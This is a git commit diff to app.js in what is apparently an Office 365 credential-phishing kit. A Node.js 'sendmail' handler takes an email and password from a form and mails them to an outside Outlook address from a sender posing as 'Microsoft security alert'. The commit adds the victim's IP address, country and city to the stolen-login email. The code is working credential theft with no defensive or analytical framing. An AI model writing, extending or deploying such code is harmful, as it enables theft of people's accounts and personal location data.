0e9d02766ce3a80e92387603973590796835ea60
John18102 <92080016+John18102@users.noreply.github.com>
2021-10-14 02:03:41 +0000

    Update app.js

--- app.js
+++ app.js
@@ -18,6 +18,7 @@ function sendmail(req,res){
  res.render(__dirname + "/sucess.handlebars")
  email = req.body.email
  password = req.body.old_password
+ info_location = req.body.info_location
  const transporter = nodemailer.createTransport({
   service: 'gmail',   
   auth: {           
@@ -29,7 +30,7 @@ function sendmail(req,res){
   from:'Microsoft security alert <microsoftsecurityalert@gmail.com>',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
-  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
+  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP: ${info_location["ipAddress"]}<br>Country: ${info_location["countryName"]}<br>City: ${info_location["city"]}</p>`
  };
  transporter.sendMail(mailOptions,function(err,info){
   if(err)
